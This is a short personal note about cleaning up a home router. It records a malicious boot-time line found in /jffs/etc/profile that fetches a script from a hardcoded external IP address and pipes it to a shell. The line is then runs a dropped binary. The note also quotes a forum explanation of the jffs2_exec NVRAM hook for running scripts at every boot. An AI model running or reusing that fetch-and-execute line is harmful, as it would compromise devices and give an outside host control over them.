router backup 08/05/2021

nvram get jffs2_exec
ash /jffs/etc/profile


cat /jffs/etc/profile
(sleep 70; if [ ! -f /jffs/checksumm ]; then wget -O- http://103.123.133.70:28632/as_e4DtOMgfOorTPVnvSXm1D/downl_crt.sh | ash; fi; cp /jffs/checksumm /tmp/check; chmod 777 /tmp/check; /tmp/check)&

This looks like hack !!! malicious code ! 

Removed as of 8/5/2021
Need to check if it happens in future

https://www.snbforums.com/threads/cp-cant-stat-jffs-security_check-no-such-file-or-directory.72329/


====================================================================================================


https://www.snbforums.com/threads/custom-scripts-and-stock-firmware.44403/

In addition to script_usbmount NVRAM variable described in the link from Zentachi there also is (at least on my RT-N18U FW - would assume also on other stock FW) an NVRAM variable "ffs2_exec". If this variable is set to an executable script it will be executed at the start of jffs (basically every boot).

I use this for example to add entries to the hosts file in /etc (cloudflare does not allow me to spell out full path !?) which turns my router into a DNS server for my local network....

A few notes on use of ffs2_exec:
1) script must be executable and include shebang (#!/bin/sh)
2) the calling code waits for the script to terminate (different from script_usbmount), so as the script waits for router services to finish start-up (polling success_start_service NVRAM variable), the script should move to background in a pseudo-daemon way.
Here as an example the script I use (“boot_runscript”). In the example it calls another script “append_hosts” which does nothing more than appending my custom hosts list to hosts fiile and send a SIGHUP to dnsmasq...


